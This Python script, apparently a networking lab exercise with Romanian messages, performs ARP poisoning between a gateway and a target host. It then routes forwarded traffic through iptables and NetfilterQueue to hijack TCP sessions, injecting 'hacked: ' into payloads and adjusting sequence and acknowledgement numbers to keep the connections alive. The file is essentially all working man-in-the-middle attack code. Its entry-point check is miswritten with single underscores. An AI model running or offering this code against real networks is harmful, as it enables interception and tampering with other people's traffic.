from scapy.all import ARP, Ether, srp, send, sniff, wrpcap, IP, TCP, Raw
from netfilterqueue import NetfilterQueue as NFQ
import threading
import signal
import time
import os

running = True
packet_count = 0
seqs = {}
acks = {}
ip_server = '198.7.0.2'
ip_client = '172.7.0.2'


def get_mac_addr(ip_addr):
    arp = ARP(op = 1, pdst = ip_addr)
    broadcast = Ether(dst = 'ff:ff:ff:ff:ff:ff')
    request = broadcast/arp 
    result = srp(request, timeout = 3, verbose = False)[0]
    if result:
        return result[0][1].src
    return None 

def arp_poisoning(target_ip, fake_ip):
    global packet_count
    target_mac = get_mac_addr(target_ip)
    poisoned_packet = ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = fake_ip)
    send(poisoned_packet, verbose = False)

def arp_spoofing(default_gateway, target):
    global running
    while running:
        arp_poisoning(default_gateway, target)
        arp_poisoning(target, default_gateway)
        time.sleep(2)
    print('Spooferul s-a oprit...')

#tcp hijack
def detect_and_alter_packet(packet):
    global ip_server, ip_client
    octets = packet.get_payload()
    scapy_packet = IP(octets)
    
    if scapy_packet.haslayer(TCP) and (scapy_packet[IP].src == ip_server or scapy_packet[IP].src == ip_client):
        print("[Inainte]: ", scapy_packet.summary())

        new_packet = alter_packet(scapy_packet)

        print("[Dupa]: ", new_packet.summary())

        send(new_packet, verbose = False)

    else:
        send(scapy_packet, verbose = False)
def alter_packet(packet_to_alter):
    global seqs, acks, packet_count
    if (packet_to_alter[TCP].flags & 0x08) and packet_to_alter[TCP].payload:
        message = Raw(b'hacked: ' + bytes(packet_to_alter[TCP].payload))
        packet_to_alter[TCP].payload = message

        old_seq = packet_to_alter[TCP].seq
        old_ack = packet_to_alter[TCP].ack

        if old_ack in acks:
            new_ack = acks[old_ack]
        else:
            new_ack = old_ack

        if old_seq in seqs:
            new_seq = seqs[old_seq]
        else:
            new_seq = old_seq

        seqs[old_seq + len(packet_to_alter[TCP].payload)] = new_seq + len(message)
        acks[new_seq + len(message)] = old_seq + len(packet_to_alter[TCP].payload)

        packet_to_alter[TCP].seq = new_seq
        packet_to_alter[TCP].ack = new_ack

        del packet_to_alter[IP].len 
        del packet_to_alter[IP].chksum

        del packet_to_alter[TCP].chksum

    return packet_to_alter

def restore(dest_ip, src_ip):
    dest_mac = get_mac_addr(dest_ip)
    src_mac = get_mac_addr(src_ip)
    packet = ARP(op = 2, pdst = dest_ip, hwdst = dest_mac, psrc = src_ip, hwsrc = src_mac)
    send(packet, count = 5, verbose = False)
    print('Reteaua a revenit la normal.')

def stop_threads(signum, frame):
    global running
    running = False

def main():
    default_gateway = '198.7.0.1'
    target = '198.7.0.2'

    signal.signal(signal.SIGINT, stop_threads)
    signal.signal(signal.SIGTERM, stop_threads)

    spoofer = threading.Thread(target=arp_spoofing, args=(default_gateway, target))
    spoofer.start()

    queue = NFQ()
    try:
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 10")
        queue.bind(10, detect_and_alter_packet)
        queue.run()
    finally:
        os.system("iptables --flush")
        queue.unbind()

    restore(default_gateway, target)
    restore(target, default_gateway)
    print('Terminat')

if _name_ == "_main_":
    main()